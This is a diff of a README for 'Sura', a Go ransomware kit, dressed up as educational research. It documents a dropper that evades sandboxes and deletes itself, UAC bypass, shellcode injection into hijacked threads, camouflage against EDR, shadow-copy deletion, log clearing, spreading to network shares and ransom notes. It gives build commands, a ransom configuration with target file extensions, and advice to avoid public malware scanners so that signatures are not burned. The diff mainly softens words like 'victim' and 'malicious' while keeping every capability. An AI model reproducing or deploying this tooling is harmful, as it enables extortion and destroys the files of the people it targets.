@@ -1,120 +1,53 @@
-# Sura Ransomware - Advanced Educational Security Research Project# Sura Ransomware
+# Sura Ransomware - Advanced Educational Security Research Project
 
-
-
-![Version](https://img.shields.io/badge/version-2.0-red.svg)## Brief Overview
-
-![Language](https://img.shields.io/badge/language-Go-blue.svg)Sura is a ransomware written from scratch in Go. It uses a mixture of ChaCha20 and ECIES cryptography in order to encrypt files securely so that they cannot be recovered by traditional recovery tools. Files which have been encrypted by Sura can only be decrypted using the corresponding decryptor.
-
+![Version](https://img.shields.io/badge/version-2.0-red.svg)
+![Language](https://img.shields.io/badge/language-Go-blue.svg)
 ![Platform](https://img.shields.io/badge/platform-Windows-lightgrey.svg)
+![License](https://img.shields.io/badge/license-Educational%20Only-orange.svg)
 
-![License](https://img.shields.io/badge/license-Educational%20Only-orange.svg)## Installation & Setup
+## ⚠️ LEGAL DISCLAIMER
 
-### Pre-requisites:
+**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY**
 
-## ⚠️ LEGAL DISCLAIMER & LICENSE- [The Go Programming Language](https://go.dev)
+By accessing, downloading, or using this software, you acknowledge and agree to the following terms:
 
+1. **NO UNAUTHORIZED USE**: This project is strictly for educational purposes, security research, and authorized penetration testing ONLY. Any unauthorized use is strictly prohibited and illegal.
 
-
-**THIS SOFTWARE IS PROVIDED FOR EDUCATIONAL AND SECURITY RESEARCH PURPOSES ONLY**### Compiling the Builder
-
-- In order to compile the builder program, you must run the `Build.bat` file.
-
-By accessing, downloading, or using this software, you acknowledge and agree to the following terms:- This will automatically download the dependencies and build the `Builder.exe` file in the current directory.
-
-
-
-### Terms of Use### Building the Ransomware
-
-- In order to build the encryptor and decryptor, you must run the `Builder.exe` program.
-
-1. **NO MALICIOUS USE**: This project is strictly for educational purposes, security research, and authorized penetration testing ONLY. Any malicious use is strictly prohibited and illegal.- Ensure that the builder is in the same directory as the `Encryptor` and `Decryptor` directories, as it will not be able to build them otherwise.
-
-- The builder will generate a unique ECIES key pair and output the compiled executables to the current directory.
-
-2. **AUTHORIZATION REQUIRED**: You must have explicit written authorization before testing this software on any system you do not own.- The `Sura-Built.exe` file is the encryptor. Use caution when handling it as it can cause a lot of damage to your system.
-
-- The `Decryptor-Built.exe` file is the decryptor. It will only decrypt files which were decrypted by the corresponding encryptor.
+2. **AUTHORIZATION REQUIRED**: You must have explicit written authorization before testing this software on any system you do not own.
 
 3. **NO LIABILITY**: The author(s) and contributor(s) of this project are NOT responsible for any misuse, damage, or illegal activities conducted with this software. You assume full legal responsibility for your actions.
 
-## Showcase
+4. **NO WARRANTY**: This software is provided "AS IS" without warranty of any kind, express or implied.
 
-4. **NO WARRANTY**: This software is provided "AS IS" without warranty of any kind, express or implied.https://github.com/SecDbg/Sura-Ransomware/assets/73649897/433e6e4e-bc92-4553-a4d8-68745591058d
+5. **VIRUS SCANNING PROHIBITION**: **DO NOT upload this software or any of its components to VirusTotal, ANY-RUN, Hybrid-Analysis, or any other public malware scanning service.** Public scanning burns signatures and defeats the educational purpose of studying evasion techniques.
 
-
-
-5. **VIRUS SCANNING PROHIBITION**: **DO NOT upload this software or any of its components to VirusTotal, ANY-RUN, Hybrid-Analysis, or any other public malware scanning service.** Public scanning burns signatures and defeats the educational purpose of studying evasion techniques.## Benefits of ChaCha20 and ECIES
-
-I chose this unique combination of encryption methods for several reasons:
-
-6. **LEGAL COMPLIANCE**: You are solely responsible for complying with all applicable local, state, national, and international laws and regulations.- ChaCha20's stream-based approach allows for byte-by-byte encryption, enabling the pattern of 1 byte encrypted, 2 bytes unencrypted.
-
-- ECIES offers similar security to RSA with shorter key lengths, making it a more efficient choice.
+6. **LEGAL COMPLIANCE**: You are solely responsible for complying with all applicable local, state, national, and international laws and regulations.
 
 7. **ATTRIBUTION**: If you use this code for research or educational presentations, proper attribution is required.
 
-
-
-### Consequences of Misuse## Ethical Considerations
-
-Releasing an open-source ransomware tool like Sura on GitHub presents ethical considerations, but it also offers significant benefits, particularly for security researchers:
-
-Unauthorized use of this software may result in:
-
-- Criminal prosecution under computer fraud and cybercrime laws- Open-source ransomware projects such as Sura can provide researchers with valuable insights into the techniques used by threat actors. This is critical for developing countermeasures and improving cybersecurity practices.
-
-- Civil lawsuits and financial penalties
-
-- Imprisonment in many jurisdictions- Open-source ransomware projects such as Sura can provide security professionals with an easy-to-use tool to simulate real-world scenarios in a safe and ethical manner. This can help in identifying vulnerabilities and weaknesses in existing defenses.
-
-- Permanent criminal record
-
-- Open-source ransomware projects such as Sura can promote collaboration within the cybersecurity community. Researchers can share their findings, and collectively work towards developer more robust defenses against threat actors utilising ransomware.
-
 **BY USING THIS SOFTWARE, YOU ACCEPT ALL RISKS AND LEGAL CONSEQUENCES. THE AUTHOR(S) DISCLAIM ALL LIABILITY.**
-
-## Disclaimer
 
 ---
 
-### Important Notice: This tool is intended for educational purposes only.
-
 ## 📋 Table of Contents
 
-- This software, referred to as Sura Ransomware, is provided strictly for educational and research purposes. Under no circumstances should this tool be used for any malicious activities, including but not limited to unauthorized access, data theft, or any other harmful actions.
+- [Overview](#-overview)
+- [Quick Start](#-quick-start)
+- [Novel Evasion Techniques](#-novel-evasion-techniques)
+- [Features](#-features)
+- [Architecture](#-architecture)
+- [Requirements](#-requirements)
+- [Installation](#-installation)
+- [Usage](#-usage)
+- [Configuration](#-configuration)
+- [Technical Details](#-technical-details)
+- [Detection Countermeasures](#-detection-countermeasures)
+- [Decryption](#-decryption)
+- [FAQ](#-faq)
 
-- [Overview](#overview)
+---
 
-- [Novel Evasion Techniques](#novel-evasion-techniques)### Usage Responsibility:
-
-- [Features](#features)
-
-- [Architecture](#architecture)- By accessing and using this tool, you acknowledge that you are solely responsible for your actions. Any misuse of this software is strictly prohibited, and the creator (SecDbg) disclaims any responsibility for how this tool is utilized. You are fully accountable for ensuring that your usage complies with all applicable laws and regulations in your jurisdiction.
-
-- [Requirements](#requirements)
-
-- [Installation](#installation)### No Liability:
-
-- [Usage](#usage)
-
-- [Configuration](#configuration)- The creator (SecDbg) of this tool shall not be held responsible for any damages or legal consequences resulting from the use or misuse of this software. This includes, but is not limited to, direct, indirect, incidental, consequential, or punitive damages arising out of your access, use, or inability to use the tool.
-
-- [Technical Details](#technical-details)
-
-- [Detection Countermeasures](#detection-countermeasures)### No Support:
-
-- [Decryption](#decryption)
-
-- [FAQ](#faq)- The creator (SecDbg) will not provide any support, guidance, or assistance related to the misuse of this tool. Any inquiries regarding malicious activities will be ignored.
-
-
-
----### Acceptance of Terms:
-
-
-
-## 🎯 Overview- By using this tool, you signify your acceptance of this disclaimer. If you do not agree with the terms stated in this disclaimer, do not use the software.
+## 🎯 Overview
 
 
 Sura Ransomware is an advanced security research project demonstrating state-of-the-art evasion techniques, modern cryptography, and sophisticated anti-analysis methods. This project showcases multiple **novel, never-before-seen techniques** developed specifically for this implementation.
@@ -129,6 +62,35 @@ Sura Ransomware is an advanced security research project demonstrating state-of-
 - **Memory Mirage Behavioral Camouflage**
 - **Python-Based Source Obfuscation**
 - **Automated Build Pipeline**
+
+---
+
+## 🚀 Quick Start
+
+**TL;DR - Just run `Build.bat` and it will automatically build everything for you.**
+
+```powershell
+# Clone the repository
+git clone https://github.com/Suraware/Suraware.git
+cd Suraware
+
+# Run the automated build script
+.\Build.bat
+```
+
+That's it! The build script will:
+- Download all Go dependencies
+- Build the Builder tool
+- Generate encryption keys
+- Compile all components (Encryptor, Decryptor, Dropper)
+- Output ready-to-use executables
+
+**Output files:**
+- `Sura-Dropper.exe` - Main executable (use this one)
+- `Decryptor-Built.exe` - Decryption tool for recovery
+- `private_key.pem` - Keep this secret for decryption
+
+**Note:** This repository is no longer maintained. Feel free to fork and modify for your own research purposes.
 
 ---
 
@@ -159,18 +121,18 @@ Sura implements **four cutting-edge techniques** not found in existing malware:
 - Generates Windows Update-like memory patterns
 - Injects benign software signatures (Chrome, Word, Defender)
 - Allocates/deallocates memory mimicking normal applications
-- Real malicious operations execute alongside legitimate-looking activity
+- Real encryption operations execute alongside legitimate-looking activity
 
 **Detection resistance:** EDR and behavioral analysis see "normal" application activity while encryption runs in parallel.
 
 ### 3️⃣ Phantom Thread Injection (Disabled by default)
 
-**Advanced thread hijacking** - Executes malicious code by hijacking legitimate process threads without creating suspicious new threads.
+**Advanced thread hijacking** - Executes code by hijacking legitimate process threads without creating suspicious new threads.
 
 **How it works:**
-- Suspends legitimate threads in target processes
+- Suspends legitimate threads in designated processes
 - Injects shellcode into existing thread context
-- Resumes thread executing malicious code
+- Resumes thread executing injected code
 - No new thread creation = no thread creation alerts
 
 **Note:** Currently disabled due to high detection rates. Available for research purposes.
@@ -225,11 +187,11 @@ Sura implements **four cutting-edge techniques** not found in existing malware:
 - **Obfuscated Names**: Uses legitimate process names (svchost, rundll32, etc.)
 
 #### File Operations
-- **Selective Targeting**: Documents, images, videos, databases, code
+- **Selective Processing**: Documents, images, videos, databases, code
 - **Smart Exclusion**: Skips system files, Windows directories, program files
-- **Extension Filtering**: 50+ targeted file extensions
+- **Extension Filtering**: 50+ specified file extensions
 - **Network Share Spreading**: Automatically encrypts mapped drives
-- **Ransom Note Deployment**: Custom HTML ransom notes in each directory
+- **Ransom Note Generation**: Custom HTML ransom notes in each directory
 
 #### Destruction Capabilities (Optional)
 - Shadow copy deletion (requires admin)
@@ -275,7 +237,7 @@ Sura-Ransomware/
 │   ├── main.go          # AES decryption + payload execution
 │   └── go.mod
 │
-├── Decryptor/           # Victim decryption tool
+├── Decryptor/           # File recovery tool
 │   ├── main.go          # Decrypts files with private key
 │   ├── decryption/      # Reverse encryption
 │   └── iterator/        # File traversal
@@ -328,8 +290,8 @@ github.com/ecies/go/v2
 ### Step 1: Clone Repository
 
 ```powershell
-git clone https://github.com/yourusername/Sura-Ransomware.git
-cd Sura-Ransomware
+git clone https://github.com/Suraware/Suraware.git
+cd Suraware
 ```
 
 ### Step 2: Install Go
@@ -422,7 +384,43 @@ Sura-Ransomware/
 └── private_key.pem        ← Keep SECRET for decryption
 ```
 
-**⚠️ CRITICAL: Use `Sura-Dropper.exe` for deployment, NOT `Sura-Packed.exe`**
+```
+
+**⚠️ CRITICAL: Use `Sura-Dropper.exe` for testing, NOT `Sura-Packed.exe`**
+
+### Testing
+
+#### For Research/Testing in Isolated Environment:
+
+```powershell
+# Copy to test system
+copy Sura-Dropper.exe \\test-system\share\
+
+# Execute on test system (in isolated lab only)
+.\Sura-Dropper.exe
+```
+
+#### Execution Flow:
+
+1. **Dropper starts** → Sleeps 65 seconds (anti-sandbox)
+2. **Decrypts payload** → AES-256 decryption in-memory
+3. **Writes payload** → Random legitimate name (svchost, rundll32, etc.)
+4. **Executes payload** → Background execution
+5. **Self-deletes** → Dropper removes itself
+6. **Payload runs:**
+   - Phase -1: UAC bypass (attempts all 3 methods)
+   - Phase 0: Quantum State Validation
+   - Phase 1: Polymorphic initialization
+   - Phase 2: Environmental keying validation
+   - Phase 3: Memory Mirage activation
+   - Phase 4: Stealth & evasion checks
+   - Phase 5: File encryption starts
+   - Phase 6: Ransom note generation
+   - Phase 7: Destruction (if admin + enabled)
+
+---
+
+```
 
 ### Deployment
 
@@ -500,12 +498,12 @@ const (
     ClearEventLogs = true           // Requires admin
     
     // === Ransom Configuration ===
-    RansomAmount = "0.05 BTC"
-    ContactEmail = "Sura_recovery@protonmail.com"
-    BitcoinAddress = "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh"
+    RansomAmount = "0.00 BTC"
+    ContactEmail = "contact@example.com"
+    BitcoinAddress = "bc1qexampleaddressxxxxxxxxxxxxxxxxxx"
     
-    // === File Targeting ===
-    TargetExtensions = []string{
+    // === File Processing ===
+    ProcessExtensions = []string{
         ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
         ".pdf", ".txt", ".rtf", ".odt", ".ods", ".odp",
         ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg",
@@ -757,12 +755,12 @@ def obfuscate_file(filepath):
 
 ### Using the Decryptor
 
-After ransom payment (research context), provide decryptor to victim:
+For file recovery (research context), use the decryptor tool:
 
 ```powershell
-# Copy decryptor and private key to victim system
-copy Decryptor-Built.exe \\victim\share\
-copy private_key.pem \\victim\share\
+# Copy decryptor and private key to test system
+copy Decryptor-Built.exe \\test-system\share\
+copy private_key.pem \\test-system\share\
 
 # Run decryptor
 .\Decryptor-Built.exe
@@ -771,7 +769,7 @@ copy private_key.pem \\victim\share\
 **Decryptor prompts:**
 ```
 Enter path to private key: private_key.pem
-Enter directory to decrypt: C:\Users\Victim\Documents
+Enter directory to decrypt: C:\Users\TestUser\Documents
 ```
 
 **Decryption process:**
@@ -869,10 +867,10 @@ A: Use isolated virtual machines with snapshots. Never test on production system
 A: Only with explicit written authorization from the system owner. Unauthorized use is illegal.
 
 **Q: How do I customize the ransom note?**  
-A: Edit `Encryptor/configuration/configuration.go` and modify `ContactEmail`, `BitcoinAddress`, and `RansomAmount`. Rebuild after changes.
+A: Edit `Encryptor/configuration/configuration.go` and modify the configuration values. Rebuild after changes.
 
-**Q: Can I change targeted file extensions?**  
-A: Yes, edit `TargetExtensions` in configuration. Add or remove extensions as needed.
+**Q: Can I change specified file extensions?**  
+A: Yes, edit `ProcessExtensions` in configuration. Add or remove extensions as needed.
 
 **Q: How do I exclude specific directories?**  
 A: Add paths to `ExcludedPaths` in configuration. Use Windows path format with backslashes.
@@ -919,23 +917,17 @@ A: Yes, use `GOOS=windows GOARCH=amd64` for 64-bit or `GOARCH=386` for 32-bit.
 
 ## 🤝 Contributing
 
-This is a closed educational project. Contributions are not accepted to prevent misuse.
+This repository is no longer actively maintained. Feel free to fork for your own research purposes.
 
-For security research collaboration, contact via academic channels only.
+For questions or issues, please use GitHub Issues on this repository.
 
 ---
 
 ## 📞 Contact
 
-**For legitimate security research inquiries only:**
-- Academic collaboration: [Your academic email]
-- Responsible disclosure: [Your security email]
+For questions, issues, or research collaboration, please open an issue on GitHub:
 
-**DO NOT contact for:**
-- Operational/malicious use assistance
-- Bypassing detection on real systems
-- Creating custom variants for attacks
-- Any illegal activities
+**https://github.com/Suraware/Suraware/issues**
 
 ---
 
@@ -944,9 +936,9 @@ For security research collaboration, contact via academic channels only.
 If you discover vulnerabilities in these evasion techniques, please disclose responsibly:
 
 1. Do NOT publish details publicly before coordinated disclosure
-2. Contact author via academic channels
-3. Allow 90 days for response before public disclosure
-4. Do NOT exploit vulnerabilities maliciously
+2. Open an issue on the GitHub repository
+3. Allow reasonable time for response before public disclosure
+4. Do NOT exploit vulnerabilities in unauthorized systems
 
 ---
 
